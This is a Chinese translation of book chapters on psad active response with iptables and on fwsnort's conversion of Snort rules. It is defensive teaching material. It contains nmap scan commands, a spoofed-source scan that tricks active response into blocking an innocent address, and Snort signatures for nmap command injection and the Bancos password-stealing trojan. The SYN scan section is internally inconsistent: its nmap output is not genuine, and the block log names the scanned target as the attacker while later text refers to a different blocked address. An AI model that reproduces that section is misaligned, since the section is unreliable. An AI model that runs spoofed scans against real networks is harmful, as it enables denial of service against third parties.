psad 不仅维护拦截规则本身的创建和维护，还维护自定义的 `psad` 链以及从内置 `iptables` 链到这些链的跳转规则。

默认的 `IPT_AUTO_CHAIN{n}` 变量指示 psad 对触发 `AUTO_IDS_DANGER_LEVEL` 阈值的 IP 地址添加总共四条拦截规则：

*   在 `PSAD_BLOCK_INPUT` 链中针对违规 IP 地址的 `DROP` 规则，该规则强制数据包跳转到此链，使得发往本地系统的攻击者数据包永远不会与本地 socket 通信。

*   在 `PSAD_BLOCK_OUTPUT` 链中针对违规 IP 地址的 `DROP` 规则，使得源自本地系统的数据包永远无法返回攻击者处。

*   在 `PSAD_BLOCK_FORWARD` 链中针对违规 IP 地址的两条 `DROP` 规则，限制源自或发往违规 IP 地址的数据包。这样，如果 `iptables` 防火墙保护内部网络上的系统，攻击者将无法连接到该系统。

下文 `/etc/psad/psad.conf` 文件中的默认 `IPT_AUTO_CHAIN{n}` 变量所示：

```
IPT_AUTO_CHAIN1   DROP, src, filter, INPUT, 1, PSAD_BLOCK_INPUT, 1;
IPT_AUTO_CHAIN2   DROP, dst, filter, OUTPUT, 1, PSAD_BLOCK_OUTPUT, 1;
IPT_AUTO_CHAIN3   DROP, both, filter, FORWARD, 1, PSAD_BLOCK_FORWARD1, 1;
```

***

¹ 如第 3 节所述，`iptables`可以通过 `REJECT` 目标发送重置包来断开 TCP 连接，但 psad 不支持与针对攻击者的通用 `DROP` 规则实例化结合使用。

² 在这种情况下，两条 `iptables` 规则是通过在相应的 `IPT_AUTO_CHAIN` 变量中使用 `both` 指令创建的（即：只需要一个 `IPT_AUTO_CHAIN` 变量即可创建两条规则）。

# 主动响应示例

在本节中，我们将深入探讨主动响应模式下使用 psad 的几个精彩示例，并展示它如何检测并拦截持续扫描开启了 `iptables` 功能的 Linux 系统的 IP 地址。本节所有主动响应示例请参见图 8-1 中的标准网络图。按照惯例，由第 20 页“默认 iptables 策略”中的 `iptablesfw` 脚本实现的默认 `iptables` 策略已实现在防火墙上。

![默认网络图](img/httpatomoreillycomsourcenostarchimages207390.png)

图 8-1 默认网络图

## 主动响应配置设置

鉴于 psad 高的可配置性，只有在我们约定对 psad 配置一组特定的值时，本节的主动响应示例才是严谨的。虽然 `/etc/psad/psad.conf` 中的并非每个配置变量都列出，但相关的主动响应和危险级别变量如下。（其中某些变量的更详细解释可以参见第 5 章，并从 http://www.cipherdyne.org/linuxfirewalls 下载完整的 `psad.conf` 文件）。

```
DANGER_LEVEL1               5;    ### 数据包数量
DANGER_LEVEL2               15;
DANGER_LEVEL3               150;
DANGER_LEVEL4               1500;
DANGER_LEVEL5               10000;
PORT_RANGE_SCAN_THRESHOLD   1;
ENABLE_PERSISTENCE          Y;  ### 不允许扫描超时
CHECK_INTERVAL              5;  ### 秒
ENABLE_AUTO_IDS             Y;
AUTO_IDS_DANGER_LEVEL       3;
AUTO_BLOCK_TIMEOUT          3600;  ### 秒
ENABLE_AUTO_IDS_REGEX       N;
AUTO_BLOCK_REGEX            ESTABLISHED;  ### 选 fwsnort 日志前缀
ENABLE_RENEW_BLOCK_EMAILS   N;  # 禁用旧拦截规则的邮件
IPTABLES_BLOCK_METHOD       Y;  # 使用 iptables
FLUSH_IPT_AT_INIT           Y;  # 在 psad 初始化时刷除旧规则
IPT_AUTO_CHAIN1   DROP, src, filter, INPUT, 1, PSAD_BLOCK_INPUT, 1;
IPT_AUTO_CHAIN2   DROP, dst, filter, OUTPUT, 1, PSAD_BLOCK_OUTPUT, 1;
IPT_AUTO_CHAIN3   DROP, both, filter, FORWARD, 1, PSAD_BLOCK_FORWARD, 1;
```

关于此主动响应有几点需要注意。首先，psad 不会通过 `AUTO_BLOCK_TIMEOUT` 永久拦截攻击者。其次，攻击者在 `psad` 实例化之前必须达到 `DANGER_LEVEL3`。最后，由于 `ENABLE_AUTO_IDS_REGEX` 设置为 `N`，psad 不需要任何日志。

### SYN 扫描

我们将使用 SYN 扫描打开 `iptables`。在这里，我们将使用 `nmap` 扫描目标。

```
Starting Nmap 7.80 (https://nmap.org)
Host scan report for 192.168.1.1
Host 192.168.1.1 is up (ICMP echo response).

Port scan 192.168.1.1 completed in 0.05 seconds
Not all ports are filtered
PORT   STATE SERVICE
22/tcp  filtered  ssh
443/tcp  filtered  https
80/tcp   filtered  http
3306/tcp filtered  mysql
8080/tcp filtered  http-proxy
```

当 `iptables` 激活时，使用 `nmap -sS -P 192.168.1.1` 执行 SYN 扫描：

```bash
$ (nmap -sS -P 192.168.1.1)
To see all details, run: nmap -sS -P 192.168.1.1
```

psad 检测到 SYN 扫描并生成了以下 syslog 消息，这些消息表明 `192.168.1.1` 已被拦截 3600 秒：

```
Mar 5 15:33:46 server psad[123]: iptablesfw psad: added iptables auto-block against 192.168.1.1 for 3600 seconds
Mar 5 15:33:52 server psad[123]: iptablesfw psad: scan detected: 192.168.1.1 -> 10.0.0.5 [2-32787] tcp=237 dangerlevel: 3
```

psad 确实通过向 `psad` 链添加拦截规则（如前所述通过 `IPT_AUTO_CHAIN{n}` 变量定义）拦截了攻击者，而且无需翻阅 `iptables -v -L` 的输出，psad 让你轻松地查看 `psad` 链中的新拦截规则：

```
[iptablesfw]# psad --fw-list
[+] Listing chains from IPT_AUTO_CHAIN keywords...

Chain PSAD_BLOCK_INPUT (1 references)
pkts  bytes target   prot opt in     out  destination
1599  70356 DROP     all  --  *      *    192.168.1.1  0.0.0/0

Chain PSAD_BLOCK_OUTPUT (1 references)
pkts  bytes target   prot opt in     out  destination
   0      0 DROP     all  --  *      *    0.0.0/0    192.168.1.1

Chain PSAD_BLOCK_FORWARD (1 references)
pkts  bytes target   prot opt in     out  destination
   0      0 DROP     all  --  *      *    0.0.0/0    192.168.1.1
   0      0 DROP     all  --  *      *    192.168.1.1  0.0.0/0
```





从状态的角度来看，还可以使用 `psad --Status` 命令查看针对 IP 地址的阻塞规则将继续生效多少秒。该命令的完整输出未在此处显示，但在输出的末尾会显示以下两行。这两行显示，在此情况下，IP 地址 `144.202.*X.*X` 剩余 3,445 秒的被拦截时间：

```
 Iptables auto-blocked IPs:
        144.202.X.X (3445 seconds remaining)
```

最后，为了确认目标从攻击者的角度来看已经变得不可访问，我们可以再次尝试扫描。这次，甚至连端口 80 都无法访问：

```
 [ext_scanner]# nmap -sS -P0 -n 71.157.X.X

Starting Nmap 4.01 ( http://www.insecure.org/nmap/ ) at 2007-03-05 15:47 EST
All 1672 scanned ports on 71.157.X.X are: filtered

Nmap finished: 1 IP address (1 host up) scanned in 35.906 seconds
```

## UDP 扫描响应

等待一小时后，我们通过 syslog 看到 psad 删除了针对 `144.202.*X.*X` 地址的阻塞规则：

```
 Mar  5 16:33:56 iptablesfw psad: removed iptables auto-block against 144.202.X.X
```

现在我们将对 `iptables` 目标尝试 UDP 扫描。由于 psad 跟踪到攻击者的源地址（`144.202.*X.*X`）已经达到了危险等级 3，因此一旦记录到第一个 UDP 数据包，它就会重新更新阻塞规则。如果攻击者对防火墙表现得友好，不启动任何可能导致 `iptables` 生成日志消息的网络流量，那么攻击者在一小时后将恢复对 Web 服务器和 DNS 服务器的连接。在下方的 Nmap 输出中，端口被标记为 `open|filtered`。这是因为 Nmap 无法假设远程 UDP 套接字一定会响应任何数据，而且由于 `iptables` 阻止了任何 ICMP 端口不可达消息的生成（UDP 栈甚至没有看到数据包，因为 `iptables` 在内核内部较低级别拦截了它们），因此无法推断出端口是关闭的。

```
 [ext_scanner]# nmap -sU -P0 -n 71.157.X.X

Starting Nmap 4.01 ( http://www.insecure.org/nmap/ ) at 2007-03-05 18:55 EST
All 1482 scanned ports on 71.157.X.X are: open|filtered

Nmap finished: 1 IP address (1 host up) scanned in 32.023 seconds
```

再次，`iptables` 阻塞规则针对 `144.202.*X.*X` IP 地址被添加，但这次在规则添加之前，psad 在扫描间隔内监控到了 66 个 UDP 数据包（记住 psad 默认每五秒检查一次新的 `iptables` 日志消息）。

```
 Mar  5 18:55:55 iptablesfw psad: added iptables auto-block against 144.202.X.X for
3600 seconds
Mar  5 18:56:00 iptablesfw psad: scan detected: 144.202.X.X -> 71.157.X.X
tcp=0 udp=66 icmp=0 dangerlevel: 4
```

## Nmap 版本扫描

在额外等待一小时后，攻击者再次回来，对 TCP 端口 80 进行了 Nmap 版本扫描。攻击者从 SYN 扫描中记得有一个服务器在监听该端口，因此想了解更多关于该服务器的信息。

```
 [ext_scanner]# nmap -sV -P0 -p 80 -n 71.157.X.X

Starting Nmap 4.01 ( http://www.insecure.org/nmap/ ) at 2007-03-05 20:40 EST
Interesting ports on 71.157.X.X:
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd

Nmap finished: 1 IP address (1 host up) scanned in 6.957 seconds
```

Apache Web 服务器绑定到 TCP 端口 80。仅通过端口 80 与目标建立 TCP 连接这一行为本身并不表示存在任何可疑活动。从传输层及以下来看，该连接看起来是无害的，`iptables` 没有记录任何内容。然而，正如我们在下一个示例中看到的，盲目 FIN 数据包则是另一回事。

## FIN 扫描响应

攻击者现在确认目标正在运行一个可访问的 TCP 服务器，可能仍然想测试主动响应软件在 TCP 方面有多严谨。例如，该软件可能没有跟踪 TCP 连接状态的方法，因此它可能会允许盲目 FIN 数据包通过服务器。对于 `iptables` 来说情况并非如此；在 `FORWARD` 链开头匹配 `INVALID` 状态并记录且丢弃数据包的规则（参见第 20 页的“默认 iptables 策略””）不会允许盲目 FIN 数据包通过内部 Web 服务器：

```
 [ext_scanner]# nmap -sF -P0 -p 80 -n 71.157.X.X

Starting Nmap 4.01 ( http://www.insecure.org/nmap/ ) at 2007-03-05 20:50 EST
Interesting ports on 71.157.X.X:
PORT   STATE         SERVICE
80/tcp open|filtered http

Nmap finished: 1 IP address (1 host up) scanned in 0.812 seconds
```

在这种情况下，Nmap 从目标 TCP 栈接收到零数据包，它必须接受此作为证据，证明端口是开放的（开放端口在接收到孤立 FIN 数据包时不会响应任何数据包，如 第 3 章] 所示）或被过滤的（因为 `iptables` 拦截了绝大多数数据包）。

## 恶意伪造扫描

此时，攻击者非常清楚目标仅仅是触发目标的主动响应。只要本地 ISP 还没有部署反欺骗措施（例如出口过滤），对于攻击者来说，在 IP 头中的源地址里填充任意比特位是非常容易的：

```
 [ext_scanner]# nmap -sS -P0 -S 68.142.X.X -e eth0 -n 71.157.X.X

Starting Nmap 4.01 ( http://www.insecure.org/nmap/ ) at 2007-03-05 21:34 EST
All 1672 scanned ports on 71.157.X.X are: filtered

Nmap finished: 1 IP address (1 host up) scanned in 32.023 seconds
```

运行在扫描系统上的 Nmap 进程从未看到目标返回任何数据包（开放端口的 SYN/ACK 数据包或关闭端口的 RST/ACK 数据包），这有两个原因：首先，`iptables` 拦截了其中的绝大多数；其次，目标生成的任何数据包都发送到了（伪造的）`68.142.*X.*X` 地址，而不是返回给扫描器。psad 看到来自 `68.142.*X.*X` 的扫描，并在扫描达到 `DANGER_LEVEL3` 后对其进行拦截：

```
 Mar  5 21:34:46 iptablesfw psad: added iptables auto-block against 68.142.X.X for
3600 seconds
Mar  5 21:34:52 iptablesfw psad: scan detected: 68.142.X.X -> 71.157.X.X
tcp=
[2-32787] SYN tcp=237 udp=0 icmp=0 dangerlevel: 3
``` TCP 空闲扫描（详细解释请参见 第 3 章）也要求扫描的源地址被伪造，因此伪造源地址不仅可以用于触发目标的主动响应机制，还可以用来完成真实的扫描。

这个示例为反对配置 psad 响应端口扫描提供了强有力的动力，并支持将其配置为仅对在已建立的 TCP 连接上传输的恶意流量做出响应。

# 将 psad 主动响应与第三方工具集成





许多软件供应商都内置了 API，以便第三方软件能够管理或与其应用程序进行交互。这可以增加应用程序的用户和安装基数，因为它提供了某种程度的灵活性、可扩展性和脚本化能力，而这些在其他情况下是无法实现的。商业安全产品领域的一个例子是 Check Point 的 `OPSEC API`，它允许第三方应用程序从远程系统管理 Check Point 防火墙（参见 [`www.opsec.com`](http://www.opsec.com)）。鉴于商业产品有时会开放 API 以允许其他应用程序轻松集成，推论开源项目会更大程度地遵循这一做法，而 `psad` 也不例外。

## 命令行界面

`psad` 提供的不仅仅是通过动态添加（和删除）`iptables` 规则来阻止违规 IP 地址的能力。活动响应功能还可以通过命令行界面（这使得响应功能易于脚本化）与第三方工具轻松集成，或者更直接地通过 Unix 域套接字与运行中的 `psad` 守护进程进行通信。以下是使用 `psad` 管理 `iptables` 规则集而不是直接在第三方应用程序中构建此功能的的一些优势：

*   `psad` 内置了根据计时器使规则失效的功能，因此不需要独立开发。
*   `psad` 在自己的自定义链中管理动态生成规则的插入和删除。这保证了 `psad` 规则与任何现有 `iptables` 策略的分离。
*   如果 `psad` 链中已存在拦截规则，`psad` 不会针对同一 IP 地址或网络添加重复规则。
*   `psad` 会查询 `/etc/psad/auto_dl` 文件以确保它不会拦截白名单中的 IP 地址或网络。
*   可以使用 `psad --Status` 命令轻松查看当前被拦截 IP 地址的状态信息。
*   可以使用 `psad --fw-list` 命令查看自定义 `psad` 链的列表。这使得在复杂的过滤策略中很容易将由 `psad` 创建的 `iptables` 规则与其他规则区分开来。

### 注意事项

通过命令行调用 `psad` 可用的所有活动响应能力都要求系统上以守护进程形式运行着一个 `psad` 实例。如果没有运行，则会生成错误并通知你 `psad` 当前未运行。

### 添加拦截规则

你可以使用 `--fw-block-ip` 命令行参数手动为特定的 IP 地址或网络向自定义的 `psad` 链添加拦截规则。例如：

```
 [iptablesfw]# psad --fw-block-ip 144.202.X.X
[+] Writing 144.202.X.X to socket. psad will add the IP address within 5 seconds.
```

一旦运行中的 `psad` 守护进程的 `CHECK_INTERVAL` 计时器过期，该 IP 地址将被添加到拦截链中，持续时间由变量 `AUTO_BLOCK_TIMEOUT` 设置：

```
 Mar  6 01:30:40 iptablesfw psad: added iptables auto-block against 144.202.X.X for
3600 seconds
```

### 移除拦截规则

要移除针对特定 IP 地址或网络的所有拦截规则，可以使用 `--fw-rm-block-ip` 命令行参数：

```
 [iptablesfw]# psad --fw-rm-block-ip 144.202.X.X
[+] Writing 144.202.X.X to socket. psad will remove the IP address within
5 seconds.
```

事实上，运行中的 `psad` 守护进程会使拦截规则过期：

```
 Mar  6 01:34:51 iptablesfw psad: removed iptables auto-block against 144.202.X.X
```

### 清空所有拦截规则

有时实现基本的网络连接可能会出现问题，在某些情况下，这些连接问题可能会因为活动响应机制而恶化。除了提供将某些 IP 地址和网络加入白名单的功能外，活动响应机制应该易于移除其对网络的影响。对于 `psad`，由于其动态生成的 `iptables` 规则，这意味着应该有一种方法可以轻松移除自定义 `psad` 链中的所有规则。`psad --Flush` 命令正是此作用：

```
 [iptablesfw]# psad --Flush
[+] Flushing psad chains via running psad daemon within 5 seconds.
```

一旦 `CHECK_INTERVAL` 计时器过期，运行中的 `psad` 守护进程会生成以下 syslog 消息：

```
 Mar  6 01:35:37 iptablesfw psad: flushing existing psad Netfilter auto-response chains
Mar  6 01:35:37 iptablesfw psad: flushed: PSAD_BLOCK_INPUT
Mar  6 01:35:37 iptablesfw psad: flushed: PSAD_BLOCK_OUTPUT
Mar  6 01:35:37 iptablesfw psad: flushed: PSAD_BLOCK_FORWARD
```

## 与 Swatch 集成

`Swatch` 工具（[`swatch.sourceforge.net`](http://swatch.sourceforge.net））由 Todd Atkins 编写，允许将 Perl 正则应用于任意日志文件。`Swatch` 可用于监控通过 syslog 的所有日志消息。`Swatch` 最常用的应用之一是查找守护进程通过 syslog 报告的身份验证失败，如下所示：

```
 Mar  7 01:20:20 iptablesfw sshd[31403]: error: PAM: Authentication failure for root
from 192.168.10.3
```

现在，我们配置 `Swatch` 使用适当的命令行参数执行 `psad`，以拦截任何发生上述身份验证失败的 IP 地址。这意味着我们需要一个使用*反向引用*（back reference）的正则表达式来从此类 syslog 消息中提取 IP 地址，并将反向引用的内容用于 `psad` 命令。这里 `Swatch` 配置文件中的两个粗体实现了此此：

```
 #
## Swatch -> psad active response for SSH bad logins
#
watchfor   /sshd.*Authentication\s*failure.*((?:[0-2]?\d{1,2}\.){3}[0-2]?\d{1,2})/
        echo mode=red
        exec "/usr/sbin/psad --fw-block-ip $1"
```

按照我们的喜好配置好 `Swatch`，我们将从命令行启动它。下面的代码列表显示了它如何对第一次身份验证失败做出反应：

```
 [iptablesfw]#  ./swatch --config-file swatchrc --tail-file /var/log/auth.log

*** swatch version 3.1.1 (pid:3543) started at Tue Mar 6 01:34:00 EST

Mar  7 01:55:20 iptablesfw sshd[31403]: error: PAM: Authentication failure for root
from 192.168.10.3
Can't ignore signal CHLD, forcing to default.
[+] Writing 192.168.10.3 to socket. psad will add the IP address
    within 5 seconds.
```

运行中的 `psad` 守护进程忠实地写入以下 syslog 消息：

```
 Mar  7 01:55:25 sshdhost psad: added iptables auto-block against 192.168.10.3 for 3600
seconds
```

此示例说明了如何利用 `psad` 的响应功能根据 OpenSSH 的身份验证失败来拦截 IP 地址。这些失败对于无法加密会话的 IDS 可能无法检测，因此此示例强调了将网络响应与日志文件中记录的活动相结合的力量。

## 与自定义脚本集成

与其使用 `psad` 命令行针对 IP 地址发布 `iptables` 规则的添加或删除指令，不如程序可以通过 Unix 域套接字 `/var/run/psad/auto_ipt.sock` 直接与运行中的 `psad` 守护进程交互。下面的 Perl 脚本 `sshauth.pl` 监控 `/var/log/auth.log` 文件中同一 IP 地址的 20 次连续身份验证失败。如果达到或超过此阈值，脚本将通过套接字向运行中的 `psad` 守护进程发送 `add IP` 命令，随后将其添加到自定义的 `psad` 拦截链中（此脚本可以从 [`www.cipherdyne.org/linuxfirewalls`](http://www.cipherdyne.org/linuxfirewalls) 下载）。





```perl
 # cat sshauth.pl
#!/usr/bin/perl -w

### perl modules
use IO::Socket;
use IO::Handle;
use strict;

#============== config ===============
my $auth_failed_threshold = 20;
my $auth_failed_regex =
    'sshd.*Authentication\s*failure.*?((?:[0-2]?\d{1,2}\.){3}[0-2]?\d{1,2})';
my $sockfile = '/var/run/psad/auto_ipt.sock';
my $sleep_interval = 5;  ### seconds
#============ end config =============
### cache previously seen IP addresses and associated failed login
### counts
my %ip_cache = ();
### open the psad domain socket for writing
❶ my $psad_sock = IO::Socket::UNIX->new($sockfile)
    or die "[*] Could not acquire psad domain ",
        "socket $sockfile: $!";
        my $file = $ARGV[0] or die "$0 <file>";
### open the logfile
open F, $file or die "[*] Could not open $file: $!";
my $skip_first_loop = 0;
for (;;) {
    unless ($skip_first_loop) {
        seek F,0,2; ### seek to the end of the file
        $skip_first_loop = 1;
    }
    my @messages = <F>;
    for my $msg (@messages) {
        if ($msg =˜ m|$auth_failed_regex|) {
            $ip_cache{$1}++;
        }
    }
    for my $src (keys %ip_cache) {
        ### block the IP address if the threshold is exceeded
❷         if ($ip_cache{$src} % $auth_failed_threshold == 0) {
            print $psad_sock "add $src\n";
        }
    }
    F->clearerr();  ### be ready for new data
    sleep $sleep_interval;
}
close F;
close $psad_sock;
exit 0;
```

❶ 处的代码打开了 psad 监控的域套套字，用于接收指示添加或移除拦截规则的指令。❷ 处的代码通过 `/var/run/psad/auto_ipt.sock` 域套接字与运行中的 psad 守护进程交互。当 IP 地址超过由 `$auth_failed_threshold` 变量定义的阈值（在本例中设置为 20）时，该代码写入字符串 `add IP`。通过运行此脚本，根据 `/etc/psad/psad.conf` 中活动响应配置变量的值，任何对 OpenSSH 进程提交 20 次身份验证失败的 IP 地址将被 psad 拦截。

***

³ 针对 SSH 的某些攻击（例如 CRC32 攻击 CVE 2001-0144）即使 SSH 是加密协议，在文中也是可以检测的。然而，通常情况下，明文入侵检测系统（IDS）无法对加密会话的特征进行详细推断。

# 结语

本章介绍了使用 psad 对恶意流量进行积极响应的技术。在多处中，这些观点都结合了建议，以尽量减少允许任何软件响应攻击时可能带来的损害影响，因为这可能会产生误报，甚至可能让攻击者尝试利用活动响应机制攻击目标。为了应对这些损害影响，psad 提供了仅对通过已建立 TCP 连接传输的攻击进行响应的能力；关于此主题的更多内容将在第 11 章 中介绍。

# 第 9 章. 将 SNORT 规则转换为 IPTABLES 规则

在本章中，我们将介绍 `fwsnort` 或 `Firewall Snort`（参见 [`www.cipherdyne.org/fwsnort`](http://www.cipherdyne.org/fwsnort)）。该软件用 Perl 编写，并将 Snort 规则转换为等效的 iptables 规则。fwsnort 项目利用 iptables 的过滤检查能力——包括大量使用 `iptables` 字符串匹配扩展——以便在 iptables 规则集中尽可能精确地匹配 Snort 规则。

尽管由于 Snort 规则语言的复杂性，并不总是能够完美地转换许多 Snort 规则，但 fwsnort 仍然能够转换 Snort 版本 2.3.3 中包含的所有规则的约 60%。

虽然 fwsnort 无法将完整的 Snort 签名集转换为 iptables 规则，但 fwsnort 总是以在线（inline）方式部署到网络流量。Snort 通常以被动方式部署，用于监控网络的可疑活动——它通常不进行在线部署，尽管它提供了这种能力。fwsnort 构建的任何策略都不限于被动数据包检测——可以配置 fwsnort 策略通过 iptables 的 `DROP` 目标丢弃恶意包。

第 10 章 和 第 11 章 将演示如何以全模式使用 fwsnort 来响应某些示例，但在之前，我们需要了解一些为什么你可能想在 Linux 系统上部署 fwsnort 的背景知识。该项目专注于增强 Linux 内核控制允许与（或通过）你的 Linux 系统通信的数据包类型的能力。通过将 Snort 签名语言的力量、Linux 内核的速度以及 `iptables` 命令的简单性相结合，fwsnort 能够增强现有 IDS/IPS 的安全态势。在另一个 IDS/IPS 旁边部署 fwsnort 是简单的，因为 fwsnort 只是构建一个执行 `iptables` 命令的壳脚本。此外，由于 `iptables` 始终在线处理网络流量，其稳定性和速度经过了严格测试。

## 深度防御

入侵检测系统本身可能会受到攻击，攻击手段从通过强制产生误报来破坏 IDS 告警机制，到通过利用 IDS 内部漏洞获取完全的代码执行。例如，可以通过 Tor 网络发送真实和伪攻击，以使攻击看起来来自与攻击者网络无关的 IP 地址。此外，入侵检测系统偶尔会出现远程可的漏洞（例如 Snort DCE/RPC 预处理器漏洞；参见 [`www.snort.org/docs/advisory-2007-02-19.html`](http://www.snort.org/docs/advisory-2007-02-19.html)）。





深度防御原则不仅适用于传统的计算机系统（服务器和桌面电脑），也适用于防火墙和入侵检测系统等安全基础设施系统。因此，有空间通过额外的机制来补充现有的入侵检测/防御系统。

## 基于目标的入侵检测与网络层碎片重组

在 IDS 中构建允许其利用终端主机特征来增强检测操作的功能，被称为`基于目标的入侵检测（`target-based intrusion detection`）。例如，`Snort` IDS 通过 `frag3` 预处理器提供网络层碎片重组，它可以将各种数据包重组算法（包括 Linux、BSD、Windows 和 Solaris IP 栈中的算法）应用于分片网络流量。这非常有用，因为它允许 `Snort` 应用与目标主机相同的碎片重组算法：如果针对 Windows 系统发送了分片攻击，但 `Snort` 使用 Linux IP 栈的算法对攻击进行重组，则攻击可能会被遗漏或错误报告。

`frag3` 预处理器不会自动将重组算法映射到主机；相反，你必须手动告诉 `Snort` 为每个监控的主机或网络运行哪种算法，这正存在配置错误的可能性。例如，假设公司的 IT 组在一个通常为 Windows 主机保留的 IP 地址范围内建立了一个新的 Linux 服务器。对于该范围内的所有 IP 地址，`Snort frag3` 预处理器配置为使用 Windows 算法对所有流量进行重组。在这种情况下，除非 IT 组告知安全组有一个新的 Linux 服务器，否则 `frag3` 配置与实际部署的操作系统之间存在脱节。针对 Linux 系统的分片攻击将被 `Snort` 使用 Windows IP 栈的算法进行重组。

在 `fwsnort` 的情况下（特别是当部署在受攻击者相同的同一系统上时），我们不需要担心分片问题，因为所应用的重组算法*就是*实际受害者 IP 栈的算法。通过 `fwsnort`，网络重组是通过使用 `Netfilter` 连接跟踪子系统（必须对流量进行重组以便将数据包分类到正确的连接）结合 `fwsnort` 策略来实现。`fwsnort` 执行的应用层检查发生在 Linux IP 栈已经对流量进行重组之后。

### 注意

使用 `fwsnort` 和 `iptables`，分片攻击不再那么令人，但基于目标的入侵检测的益处不仅限于网络分片问题，这是 IDS 社区中活跃的研究开发领域。例如，IDS 可以使用操作系统和应用程序信息来过滤掉潜在的误报，或增强报告攻击的严重性。例如，如果一个利用 Microsoft IIS Web 服务器缓冲区溢出的攻击针对的是 Apache Web 服务器，那么该攻击没有可能危及目标。在这种情况下，如果攻击被 IDS 检测到，该事件的严重性应该比攻击针对真实的 IIS 服务器时要低得多。

## 轻量级占用足迹（Lightweight Footprint）

被频繁使用的系统可能缺乏可用资源来部署额外的用于入侵检测的用户态进程（如 `Snort`）。在 `fwsnort` 的情况下，数据包检查直接在 Linux 内核中进行，因此这通常会对系统资源产生轻量级使用足迹——不需要从内核内存复制数据到用户态进程中（就像 IPS 那样）。在由于资源限制而不宜部署专用 IDS/IPS 的系统中，`fwsnort` 可以提供一个可行的替代方案。

## 内联响应

由于 `fwsnort` 构建的 `iptables` 签名策略对于网络流量始终是内联的（inline），因此它是针对某些特别恶意攻击采取行动的理想选择。例如，假设在你的基础设施中部署的 Linux 服务器软件（如 `BIND`）中发现了一个新漏洞。如果 `Snort` 社区开发了检测该漏洞攻击的签名，`fwsnort` 可以配置为丢弃匹配攻击的数据包（通过 `iptables` 的 `DROP` 目标），并通过 `fwsnort` 通过 `REJECT` 目标发布标准的协议响应（关于此主题的更多信息见第 11 章）。

如果服务器运行时间与服务协议（SLA）挂钩，那么在关机和补丁之前可能会有一个等待期，而且这假设了修复漏洞的补可用（并非总是如此）。如果在调度维护窗口应用补丁之前服务器软件必须保持全局可用，内联防御机制可以针对该漏洞利用提供宝贵的保护。（此外，由于 `fwsnort` 策略是轻量级的，它们通常可以与其他防御机制（如以后联模式运行的 `Snort`）一起部署。）

### 注意

由于 `fwsnort` 只是构建一个执行 `iptables` 命令的 shell 脚本，它可以轻松部署在具有 `Zenoss` 等工具的许多系统中，这些工具可以通过 `SSH` 一次性在许多远程系统中执行命令。这使得在基础设施中的所有 Linux 系统中使用 `fwsnort` 变得简单。

¹ `fwsnort` 的早期版本最初基于 William Stearns 写的 shell 脚本 `snort2iptables`。

² `Snort-2.3.3` 规则集和 Bleeding Snort 规则集随 `fwsnort` 源码免费分发，不受 Sourcefire 分发的 VRT 签名许可条款限制。

³ 我在这里强调 IPS 是因为在 IDS 的情况下，`Snort` 可以使用共享内存页方法从内核获取数据包数据（这需要内核支持 `CONFIG_PACKET_MMAP`），这比 `Snort` 在 IPS 模式下那样通过 netlink 套接字获取数据包数据对性能的影响要小。

# 签名翻译示例

在深入研究使用 `fwsnort` 将 `Snort` 规则转换为 `iptables` 规则的理论方面之前，我们先来看几个已经翻译过的 `Snort` 规则。

## Nmap 命令尝试签名

`Snort` 文件 `web-attacks.rules` 中的 `Nmap` `command attempt` 签名检测通过 Web 服务器执行 `Nmap` 扫描器的尝试。

该签名用于检测攻击者尝试使用 Web 服务器扫描可能更容易被 Web 服务器访问的其它系统——本地防火墙规则对 Web 服务器的通信可能比对攻击者的 IP 地址更宽松（特别是当 Web 服务器直接连接到内部网络时）。攻击者通常会滥用未正确过滤用户输入的 CGI 应用程序来实施此类扫描尝试。

每当字符串 `"nmap%20"` 跨越已建立的 TCP 连接时，该签名就会被触发（如下文加粗所示）：

```
alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:"WEB-ATTACKS nmap command attempt"; flow:to_server,established; content:"nmap%20"; nocase; classtype:web-application-attack; sid:1361; rev:5;)
```

`Nmap` 执行签名非常优雅；它以通用的方式检测可疑活动。`Snort` 不需要解释 CGI 应用程序是否受到 `Nmap` 尝试的影响——尝试*本身*就是可疑的。





将此签名转换为使用 `fwsnort` 的 `iptables` 策略将得到如下所示的规则。我们将在第 10 章 中深入讨论 `iptables` 命令的细节，但现在请注意，这是一个 `iptables` `LOG` 规则，它使用 `iptables` 字符串匹配来模拟 Snort 规则在网络流量中查找的内容。`iptables` 的注释匹配也用于在内核中使用原始 Snort 的 `msg` 字段对该规则进行标记：

```
 $IPTABLES -A FWSNORT_FORWARD_ESTAB -p tcp --dport 80 -m string --string "nmap%20"
--algo bm -m comment --comment "sid:1361; msg: WEB-ATTACKS nmap command attempt;
classtype: web-application-attack; rev: 5; FWS:1.0;" -j LOG --log-ip-options --log-
tcp-options --log-prefix "[20] SID1361 ESTAB "
```

另一种通过 Web 服务器检测不当 Nmap 执行的签名编写方法，是查找从 Web 服务器*返回*到 Web 客户端的 Nmap 输出。对于检测成功的 Nmap 执行，这种方法更有效，而不是检测滥用 CGI 应用程序的尝试，因为（非恶意的）服务器没有自由对其返回的数据进行混淆以试图规避入侵检测系统——而攻击者确实拥有这种自由并频繁使用它。^([51]) 这样的签名将查找典型 Nmap 输出中不变的部分，例如字符串 `"Interesting ports on"`，如下所示：

```
 alert tcp $HTTP_SERVERS $HTTP_PORTS -> $EXTERNAL_NET any (msg:"WEB-ATTACKS nmap
command success"; flow:from_server,established; content:"Interesting ports on";
classtype:
web-application-attack; sid:2007008; rev:1;

```

## Bleeding Snort "Bancos Trojan" 签名

Bancos 木马是一段恶性代码，它可以通过伪装成巴西某些银行的接口来窃取密码。（更多信息请参见下方 Snort 规则引用字段中的 [symantec.com](http://symantec.com) 网页链接。）Bleeding Snort 项目开发了这个签名，可以在 `fwsnort` 源码的 `bleeding-all.rules` 文件中找到。该签名比之前的 Nmap 执行签名更复杂，因为它需要加粗显示所示的两个应用 `content` 匹配：

```
 alert tcp $EXTERNAL_NET $HTTP_PORTS -> $HOME_NET any (msg: "BLEEDING-EDGE VIRUS
Trojan-Spy.Win32.Bancos Download"; flow: established,from_server; content:
"[AspackDie!]";
content:"|0f 6d 07 9e 6c 62 6c 68 00 d2 2f 63 6d 64 9d 11 af af 45 c7 72 ac 5f
3138 d0|"; classtype: trojan-activity; reference:url,
securityresponse.symantec.com/avcenter/venc/data/pwsteal.bancos.b.html; sid: 2001726;
rev:6; )
```

